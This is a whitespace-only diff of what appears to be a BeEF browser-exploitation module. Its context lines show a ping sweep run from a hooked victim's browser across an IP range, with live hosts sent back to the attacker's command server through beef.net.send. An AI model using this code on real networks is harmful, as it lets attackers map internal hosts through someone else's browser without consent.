@@ -21,7 +21,7 @@ beef.execute(function() {
     if(ipBounds.length>1) {
 	    var lowerBound = parseInt(ipBounds[0].split('.')[3]);
         var upperBound = parseInt(ipBounds[1].split('.')[3]);
-	
+
         for(i=lowerBound;i<=upperBound;i++){
         	ipToTest = ipBounds[0].split('.')[0]+"."+ipBounds[0].split('.')[1]+"."+ipBounds[0].split('.')[2]+"."+i
            	ips.push(ipToTest);
@@ -33,7 +33,7 @@ beef.execute(function() {
 
     if(ips.length==1) verbose=true;
 
-    
+
     function do_scan(host, timeout) {
 	    var status=false;
 	    var ping="";
@@ -55,7 +55,7 @@ beef.execute(function() {
     // use of setInterval trick to avoid slow script warnings
     var i=0;
     if(ips.length>1) {
-	    var int_id = setInterval( function() { 
+	    var int_id = setInterval( function() {
 		var host = do_scan(ips[i++],timeout);
 		if(host!="") beef.net.send('<%= @command_url %>', <%= @command_id %>, 'host='+host);
 		if(i==ips.length) { clearInterval(int_id); beef.net.send('<%= @command_url %>', <%= @command_id %>, 'host=Ping sweep finished'); }
@@ -66,4 +66,3 @@ beef.execute(function() {
     }
 
 });
-
